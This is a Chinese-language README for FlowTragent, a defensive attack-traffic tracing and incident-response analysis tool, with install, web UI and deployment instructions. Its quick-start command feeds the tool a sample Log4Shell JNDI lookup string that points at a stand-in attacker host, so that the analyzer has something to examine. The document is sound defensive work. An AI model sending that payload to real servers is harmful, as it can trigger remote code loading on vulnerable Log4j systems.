# FlowTragent 中文说明

FlowTragent 是一个面向攻击流量溯源、应急响应辅助和证据驱动研判的自动化分析系统。它以 NOVA-F 作为检索引擎，同时保留独立的 PCAP 解析、payload/日志接入、攻击链分析、C2 检测、可选 RAG 上下文、定时 Ollama 复盘、实时告警和报告生成能力。

## 核心能力

- 支持 payload、PCAP、访问日志、DNS 日志、端点日志、应用日志、Zeek 日志和 Suricata EVE 接入。
- 生成攻击链阶段、证据 ID、置信度驱动因素和降低因素。
- 检测 HTTP、DNS、TCP、ICMP 中的 C2 beacon 与异常行为。
- 使用 NOVA-F 做 CVE 候选检索，并结合规则 rerank 与低相似度抑制。
- 输出 Mermaid、DOT、SVG 证据图谱。
- 提供 Web UI，支持 token 保护、上传校验、报告浏览、告警视图和图谱查看。
- 支持 live capture/analyzer worker、告警去重、跨窗口活动关联、速率限制和定时 LLM 复盘。
- 暴露 `/health` 与 Prometheus `/metrics`，支持 JSON Lines 审计日志和 Webhook 通知。
- 提供 Dockerfile、Docker Compose、systemd units 和统一部署文档。

## 快速开始

```bash
python3 -m venv flowtragent_env
source flowtragent_env/bin/activate
python -m pip install --upgrade pip setuptools wheel
python -m pip install -r requirements.txt
python main.py --mode payload --input 'GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1 Host: victim' --demo-index
```

预期结果：`reports/` 下生成 JSON 与 Markdown 报告，包含影响判断、CVE 候选、已观察/缺失证据、置信度因素和攻击链上下文。

## 一键部署

Linux/WSL 推荐使用：

```bash
bash scripts/install.sh
```

脚本会创建 `.venv`、安装依赖、构建 demo index、生成本地 `.env` token，并启动 Web UI。Docker 模式可使用：

```bash
bash scripts/install.sh --docker
```

## Web 与观测

```bash
FLOWTRAGENT_HOST=127.0.0.1 FLOWTRAGENT_PORT=5000 scripts/run_web_prod.sh
curl http://127.0.0.1:5000/health
curl http://127.0.0.1:5000/metrics
```

设置 `FLOWTRAGENT_TOKEN` 后，上传、删除、下载、导出、图谱和告警页面会受到 token 保护。

## 文档

- [部署指南](user_docs/FlowTragent_部署指南.md)
- [API 中文说明](user_docs/API_CN.md)
- [架构中文说明](user_docs/ARCHITECTURE_CN.md)
- [产品白皮书](user_docs/FlowTragent_产品白皮书.md)
- [开发报告](user_docs/FlowTragent_开发报告.md)
- [DataCon 检索评估报告](user_docs/FlowTragent_DataCon检索评估报告.md)
- [贡献指南中文说明](CONTRIBUTING_CN.md)
- [更新日志中文说明](CHANGELOG_CN.md)

## 运行产物边界

不要提交运行产物或敏感数据：`logs/`、`reports/`、`data/live/`、`data/tmp/`、`data/index/`、真实 PCAP、原始 DataCon 数据、模型权重或私有 embedding。

## 许可证

FlowTragent 使用 MIT License 发布，详见 [LICENSE](LICENSE)。
